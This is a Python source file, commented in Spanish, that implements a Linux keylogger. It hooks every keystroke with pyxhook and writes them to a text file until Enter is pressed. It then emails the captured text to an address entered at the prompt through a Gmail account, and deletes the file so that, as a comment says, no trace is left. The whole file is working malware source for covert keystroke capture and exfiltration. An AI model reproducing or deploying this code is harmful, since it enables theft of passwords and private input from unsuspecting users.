
from enviador_correo import *
import pyxhook                
import time
from os import remove


#abre el documento.txt donde estan las teclas capturadas, las lee y remplaza los string 'space' por un espacio
def fix_text(): 
    f=open("kk.txt")
    lines = f.readlines()
    f.close()
    lines_str=str(lines)
    x = lines_str.replace("space", " ")
    return x

#Función de evento, se llama cada vez que el usuario pulsa una tecla del teclado
def Enter_event(event):
    global running

    if event.Ascii == 32: #Si la tecla pulsada es Espacio (Ascii 32) se escribe en el documento.txt un espacio
        f.write(' ')
    evento=str(event.Key) #convertimos la variable event.key(tecla pulsada) en string de texto.
    f.write(evento)

    if event.Ascii == 32: #Se escribe un espacio antes y despues de leer el evento porque por prueba y error, se comprobo que así quedaba mejor el resultado final.
        f.write(' ')

    if event.Ascii == 13: #Si la tecla pulsada es Enter (Ascii 13) la variable global running se hace False y finaliza el bucle while que le da vida al programa
        running = False
    
def Keylogger(): #Función que unicamente se usa para enlazar el programa desde este punto al llamarla externamente como módulo, solo contiene un print con un salto de linea.
    print("\n")
  
mail=input('\nIntroduce una cuenta de correo de Gmail: ')
password=input('\nIntroduce la contraseña de la cuenta: ')
mail_send=input('\nIntroduce la cuenta de correo a la que lo quieres enviar: ')

print('\nModo de captura de teclado activado\n')

#Se abre un archivo de texto llamado kk.txt
f=open("kk.txt","w")

#Se crea una instancia del Hookmanager que se encarga en linux de detectar el pulsado de teclas.
hookman = pyxhook.HookManager()

#Cada vez que se pulsa una tecla, se llama a la función de evento Enter_event
hookman.KeyDown = Enter_event

#Se llama al método Hookkeyborad.
hookman.HookKeyboard()

#Se comienza a capturar el pulsado de teclas
hookman.start()


#La variable global running (funciones de evento no permiten hacen returns) es inicialmente True y cuando se haga False se saldra del bucle while
running = True

while running:
    time.sleep(0.1)  #Cada 0,1 se esta leyendo si el usuario pulsa o no alguna tecla


hookman.cancel()     #Una vez fuera del bucle, se cierra el Hookmanager del objeto hookman
f.close()            #Se cierra el documento.txt

#Se llama a esta función que lo que hace es corregir un poco la legiblidad final del documento de texto que se va a enviar por correo eliminando por ejemplo el string 'space' generado al pulsar la tecla espacio por un espacio real.
text=fix_text()    
print('\nModo de captura de teclado desactivo\n')

#Se manda un correo usando la función enviador del módulo enviador_correo importada arriba de todo
enviador(mail_send,mail,password,'Keylogger',text)

#Borra el archivo para que no deje rastro.
remove('kk.txt')
